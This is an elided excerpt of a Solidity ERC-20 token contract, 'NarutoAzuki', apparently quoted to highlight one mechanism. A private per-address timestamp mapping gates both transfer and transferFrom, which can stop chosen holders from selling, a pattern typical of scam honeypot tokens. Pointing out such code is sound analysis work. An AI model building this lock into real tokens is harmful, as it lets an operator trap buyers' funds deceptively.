...
contract NarutoAzuki is Context, IERC20, Ownable {
    ...
    mapping (address => uint256) private _transferterefest;
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        require(block.timestamp >= _transferterefest[_msgSender()], "Transfer is currently restricted for this address");
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        ...
        require(block.timestamp >= _transferterefest[sender], "Transfer is currently restricted for this address");
